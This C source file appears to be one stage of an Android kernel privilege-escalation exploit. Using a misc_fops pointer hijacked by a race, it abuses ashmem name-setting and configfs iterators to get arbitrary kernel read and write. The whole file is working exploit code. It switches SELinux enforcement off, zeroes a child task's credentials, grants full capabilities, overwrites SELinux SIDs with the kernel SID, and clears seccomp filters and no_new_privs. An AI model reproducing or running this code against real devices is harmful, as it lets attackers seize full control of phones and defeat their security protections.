/* cfi/configfs post-race write layer (port of rmp src/61).
 *
 * The race plants exactly ONE controlled write: the crafted waiter's
 * pi_tree_entry relinks misc_fops <- fake_fops during the PI walk. After
 * that, a freshly opened ashmem fd inherits the hijacked pointer via
 * misc_open, so ASHMEM_SET_NAME (real ashmem_ioctl) plants a
 * configfs_buffer control block over the ashmem_area name bytes and
 * pwrite/pread dispatch through fake_fops.write_iter/read_iter = real
 * configfs iterators: arbitrary kernel read/write. W1/W2/W3 all run on
 * these primitives; unlike rmp there is no second-stage pipe physrw —
 * the child task comes from the perf leak, so the configfs ops alone
 * cover every stage. */

#include "common.h"

static char g_ashmem_path[256];
static int g_cfi_fd = -1;
static int g_cfi_ready;
static uint64_t g_slide;

/* Written by prepare_skb_payload (tcp branch): scratch page used for the
 * write test. */
uintptr_t g_binwrite_target;

int cfi_symbols_present(void) {
  return NOOP_LLSEEK_OFF && CONFIGFS_READ_ITER_OFF &&
         CONFIGFS_BIN_WRITE_ITER_OFF && ASHMEM_IOCTL_OFF &&
         ASHMEM_FOPS_OFF && ASHMEM_MISC_FOPS_OFF;
}

int cfi_acquired(void) {
  return g_cfi_ready;
}

/* Runtime text address for a kallsyms offset; g_slide stays 0 unless the
 * acquire-time leak proves otherwise (these bootloader-fixed images run
 * slide 0 — a nonzero value fails the acquire instead). */
static uintptr_t cfi_text_addr(uintptr_t off) {
  return KIMAGE_TEXT_BASE + g_slide + off;
}

uintptr_t cfi_plant_text_addr(uintptr_t off) {
  return cfi_text_addr(off);
}

/* ---- ashmem device discovery (rmp init_ashmem_path) ---- */

static int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  close(fd);
  snprintf(g_ashmem_path, sizeof(g_ashmem_path), "%s", path);
  return 1;
}

static int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

static void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;
      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }
      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

static int open_ashmem_device(void) {
  if (!g_ashmem_path[0]) {
    init_ashmem_path();
  }
  return open(g_ashmem_path, O_RDWR | O_CLOEXEC);
}

/* ---- blob plant: zeros need explicit NUL terminators, backwards ---- */

static int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));
  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

static int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));
  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

static int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }
  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 && try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

/* ---- arbitrary kernel read/write through the hijacked fd ---- */

static ssize_t configfs_write_once(
    int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }
  errno = 0;
  return pwrite(fd, data, len, 0);
}

static ssize_t configfs_read_once(
    int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
  uintptr_t page = target - (uintptr_t)pos;
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }
  errno = 0;
  return pread(fd, data, len, pos);
}

static int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

static int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

static uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  if (configfs_read_once(fd, target, &value, sizeof(value)) !=
      (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

static uint32_t kernel_read32(int fd, uintptr_t target) {
  uint32_t value = 0;
  if (configfs_read_once(fd, target, &value, sizeof(value)) !=
      (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

static ssize_t kernel_write_data(
    int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

/* ---- acquire / stages / release ---- */

static uintptr_t misc_fops_alias(void) {
  return data_addr(KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF);
}

int cfi_try_acquire(void) {
  if (!cfi_symbols_present()) {
    return 0;
  }
  int fd = open_ashmem_device();
  int dirty = 0;
  if (fd < 0) {
    pr_warning("cfi acquire: open %s errno=%d\n", g_ashmem_path, errno);
    return 0;
  }

  /* Step 4 (gate): the race write must already have landed. */
  uintptr_t misc_fops = misc_fops_alias();
  uint64_t pre_fops = 0;
  if (configfs_read_once(fd, misc_fops, &pre_fops, sizeof(pre_fops)) !=
          (ssize_t)sizeof(pre_fops) ||
      pre_fops != fake_fops) {
    goto fail;
  }

  /* Step 1: write test into the payload scratch page. */
  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  if (configfs_write_once(fd, g_binwrite_target, payload, sizeof(payload)) !=
      (ssize_t)sizeof(payload)) {
    goto fail;
  }
  dirty = 1;

  /* Step 2: repair the llseek erase marker to the real noop_llseek. */
  uint64_t llseek = cfi_text_addr(NOOP_LLSEEK_OFF);
  uint64_t after_llseek = 0;
  uintptr_t llseek_slot = fake_fops + FOPS_LLSEEK_OFF;
  if (configfs_write_once(
          fd, llseek_slot, &llseek, sizeof(llseek)) !=
      (ssize_t)sizeof(llseek)) {
    goto fail;
  }
  if (configfs_read_once(
          fd, llseek_slot, &after_llseek, sizeof(after_llseek)) !=
          (ssize_t)sizeof(after_llseek) ||
      after_llseek != llseek) {
    goto fail;
  }

  /* Step 3: read back the write test. */
  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  if (configfs_read_once(fd, g_binwrite_target, readback, sizeof(readback)) !=
          (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    goto fail;
  }

  /* Re-gate, then prove the aliases describe THIS kernel: the real
   * ashmem_fops.ioctl must equal our extracted ashmem_ioctl. A mismatch
   * means KASLR slide or a wrong kernel_phys_load — both fatal for every
   * alias downstream, so abort with the values in the log. */
  uint64_t gate = 0;
  if (configfs_read_once(fd, misc_fops, &gate, sizeof(gate)) !=
          (ssize_t)sizeof(gate) ||
      gate != fake_fops) {
    goto fail;
  }
  uint64_t ioctl_ptr = kernel_read64(
      fd, data_addr(KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF) + FOPS_IOCTL_OFF);
  uintptr_t want_ioctl = cfi_text_addr(ASHMEM_IOCTL_OFF);
  if (!is_kernel_ptr(ioctl_ptr)) {
    pr_error("cfi: ashmem_fops.ioctl unreadable got=%016llx — check "
             "kernel_phys_load\n",
             (unsigned long long)ioctl_ptr);
    goto fail;
  }
  if (ioctl_ptr != want_ioctl) {
    pr_error("cfi: ashmem_fops.ioctl=%016llx want=%016llx (slide "
             "%+lld or wrong image) — aborting\n",
             (unsigned long long)ioctl_ptr,
             (unsigned long long)want_ioctl,
             (long long)(ioctl_ptr - want_ioctl));
    goto fail;
  }

  g_cfi_fd = fd;
  g_cfi_ready = 1;
  pr_success("cfi acquired: fake_fops=%016zx binwrite=%016zx\n",
             fake_fops, g_binwrite_target);
  return 1;

fail:
  if (dirty) {
    uint64_t original = data_addr(KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF);
    configfs_write_once(fd, misc_fops_alias(), &original, sizeof(original));
    uint64_t null_owner = 0;
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  }
  close(fd);
  return 0;
}

int cfi_stage_selinux_off(void) {
  if (!g_cfi_ready) {
    return 0;
  }
  uintptr_t target = data_addr(SELINUX_ENFORCING);
  uint32_t before = kernel_read32(g_cfi_fd, target);
  uint32_t zero = 0;
  int wrote = kernel_write_data(g_cfi_fd, target, &zero, sizeof(zero)) ==
              (ssize_t)sizeof(zero);
  uint32_t after = kernel_read32(g_cfi_fd, target);
  pr_info("cfi selinux enforcing %u -> %u (write ok=%d)\n", before, after,
          wrote);
  return wrote && after == 0;
}

int cfi_patch_child_cred(uintptr_t child_task) {
  if (!g_cfi_ready || !is_direct_ptr(child_task)) {
    return 0;
  }
  int fd = g_cfi_fd;
  uint64_t cred = kernel_read64(fd, child_task + TASK_CRED_OFF);
  if (!is_direct_ptr(cred)) {
    pr_warning("cfi cred: bad cred ptr %016llx\n",
               (unsigned long long)cred);
    return 0;
  }
  pr_info("cfi cred: task=%016zx cred=%016llx\n", child_task,
          (unsigned long long)cred);

  uint64_t zero_ids[4] = {0};
  if (kernel_write_data(fd, cred + CRED_UID_OFF, zero_ids,
                        sizeof(zero_ids)) != (ssize_t)sizeof(zero_ids)) {
    return 0;
  }
  uint32_t securebits = 0;
  if (kernel_write_data(fd, cred + CRED_SECUREBITS_OFF, &securebits,
                        sizeof(securebits)) !=
      (ssize_t)sizeof(securebits)) {
    return 0;
  }
  uint64_t caps[CRED_CAP_WORDS] = {CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL,
                                   CAP_FULL};
  if (kernel_write_data(fd, cred + CRED_CAPS_OFF, caps, sizeof(caps)) !=
      (ssize_t)sizeof(caps)) {
    return 0;
  }
  uint64_t caps_after[CRED_CAP_WORDS] = {0};
  if (configfs_read_once(fd, cred + CRED_CAPS_OFF, caps_after,
                         sizeof(caps_after)) != (ssize_t)sizeof(caps_after)) {
    return 0;
  }
  for (size_t i = 0; i < CRED_CAP_WORDS; i++) {
    if (caps_after[i] != CAP_FULL) {
      pr_warning("cfi cred: cap verify failed idx=%zu got=%016llx\n", i,
                 (unsigned long long)caps_after[i]);
      return 0;
    }
  }

  /* SELinux: kernel sid over osid/sid in the cred blob. */
  uint64_t security = kernel_read64(fd, cred + CRED_SECURITY_OFF);
  if (!is_direct_ptr(security)) {
    pr_warning("cfi cred: bad security ptr %016llx\n",
               (unsigned long long)security);
    return 0;
  }
  uint32_t lbs = kernel_read32(fd, data_addr(SELINUX_BLOB_SIZES));
  uint32_t sid_pair[2] = {SELINUX_KERNEL_SID, SELINUX_KERNEL_SID};
  uintptr_t osid_addr = security + lbs;
  if (kernel_write_data(fd, osid_addr, sid_pair, sizeof(sid_pair)) !=
      (ssize_t)sizeof(sid_pair)) {
    return 0;
  }
  uint32_t sid_back[2] = {0, 0};
  configfs_read_once(fd, osid_addr, sid_back, sizeof(sid_back));
  pr_info("cfi cred: ids zeroed caps=%016llx sid %u/%u\n",
          (unsigned long long)caps_after[0], sid_back[0], sid_back[1]);
  return sid_back[0] == SELINUX_KERNEL_SID && sid_back[1] == SELINUX_KERNEL_SID;
}

int cfi_stage_seccomp_clear(uintptr_t child_task) {
  if (!g_cfi_ready || !is_direct_ptr(child_task)) {
    return 0;
  }
  int fd = g_cfi_fd;
  uintptr_t flags_addr = child_task + TASK_THREAD_INFO_FLAGS_OFF;
  uintptr_t atomic_addr = child_task + TASK_ATOMIC_FLAGS_OFF;
  uintptr_t seccomp_addr = child_task + TASK_SECCOMP_OFF;

  uint64_t flags_before = kernel_read64(fd, flags_addr);
  uint64_t atomic_before = kernel_read64(fd, atomic_addr);
  uint32_t mode_before =
      kernel_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_before =
      kernel_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_before = kernel_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);

  uint64_t flags_want = flags_before & ~(1ULL << TIF_SECCOMP_BIT);
  uint64_t atomic_want = atomic_before & ~(1ULL << PFA_NO_NEW_PRIVS_BIT);
  uint32_t zero32 = 0;
  uint64_t zero64 = 0;

  int ok = 1;
  if (flags_want != flags_before) {
    ok &= kernel_write_data(fd, flags_addr, &flags_want,
                            sizeof(flags_want)) == (ssize_t)sizeof(flags_want);
  }
  if (atomic_want != atomic_before) {
    ok &= kernel_write_data(fd, atomic_addr, &atomic_want,
                            sizeof(atomic_want)) ==
          (ssize_t)sizeof(atomic_want);
  }
  ok &= kernel_write_data(fd, seccomp_addr + SECCOMP_MODE_OFF, &zero32,
                          sizeof(zero32)) == (ssize_t)sizeof(zero32);
  ok &= kernel_write_data(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF,
                          &zero32, sizeof(zero32)) == (ssize_t)sizeof(zero32);
  ok &= kernel_write_data(fd, seccomp_addr + SECCOMP_FILTER_OFF, &zero64,
                          sizeof(zero64)) == (ssize_t)sizeof(zero64);

  uint64_t flags_after = kernel_read64(fd, flags_addr);
  uint64_t atomic_after = kernel_read64(fd, atomic_addr);
  uint32_t mode_after = kernel_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_after =
      kernel_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_after =
      kernel_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);

  pr_info("cfi seccomp ok=%d flags=%016llx/%016llx atomic=%016llx/%016llx "
          "mode=%u/%u count=%u/%u filter=%016llx/%016llx\n",
          ok, (unsigned long long)flags_before,
          (unsigned long long)flags_after,
          (unsigned long long)atomic_before,
          (unsigned long long)atomic_after, mode_before, mode_after,
          count_before, count_after, (unsigned long long)filter_before,
          (unsigned long long)filter_after);

  int tif_clear = (flags_after & (1ULL << TIF_SECCOMP_BIT)) == 0;
  int nnp_clear = (atomic_after & (1ULL << PFA_NO_NEW_PRIVS_BIT)) == 0;
  return ok && tif_clear && nnp_clear && mode_after == 0 &&
         count_after == 0 && filter_after == 0;
}

void cfi_release(void) {
  if (!g_cfi_ready || g_cfi_fd < 0) {
    return;
  }
  int fd = g_cfi_fd;
  g_cfi_fd = -1;
  g_cfi_ready = 0;

  uintptr_t misc_fops = misc_fops_alias();
  uint64_t original = cfi_text_addr(ASHMEM_FOPS_OFF);
  ssize_t restore =
      configfs_write_once(fd, misc_fops, &original, sizeof(original));
  uint64_t after = 0;
  configfs_read_once(fd, misc_fops, &after, sizeof(after));

  uint64_t null_owner = 0;
  ssize_t owner = configfs_write_once(fd, fake_fops, &null_owner,
                                      sizeof(null_owner));
  close(fd);

  if (restore != (ssize_t)sizeof(original) ||
      after != original || owner != (ssize_t)sizeof(null_owner)) {
    pr_warning("cfi release incomplete restore=%zd after=%016llx "
               "owner=%zd — ashmem may be degraded until reboot\n",
               restore, (unsigned long long)after, owner);
    return;
  }
  pr_success("cfi released: misc_fops restored\n");
}
